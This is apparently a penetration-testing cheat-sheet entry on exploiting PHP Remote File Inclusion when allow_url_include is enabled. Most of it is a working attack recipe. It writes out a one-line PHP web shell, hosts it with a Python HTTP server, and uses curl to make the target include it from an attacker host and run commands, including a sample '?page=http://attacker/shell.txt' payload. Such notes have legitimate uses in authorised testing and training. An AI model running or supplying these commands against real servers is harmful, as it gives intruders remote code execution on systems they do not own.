# 04.05 Remote File Inclusion RFI

> Abuse `allow_url_include=On` to make `include()` fetch a remote shell from your HTTP server: `?page=http://attacker/shell.txt`.

## Overview

When PHP `allow_url_include` is on (rare in modern stacks), the include() can pull code from your HTTP server: `?page=http://attacker/shell.txt`. Easy code execution if you find it.

## Steps

- **Confirm allow_url_include** — phpinfo / behaviour test.
- **Host malicious .txt** with PHP code (filename matters less than content).
- **Trigger include** — `?page=http://<LHOST>/s.txt`.

## Commands

### Host + trigger

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/s.txt
python3 -m http.server 80 -d /tmp
curl 'http://<TARGET>/index.php?page=http://<LHOST>/s.txt&c=id'
```
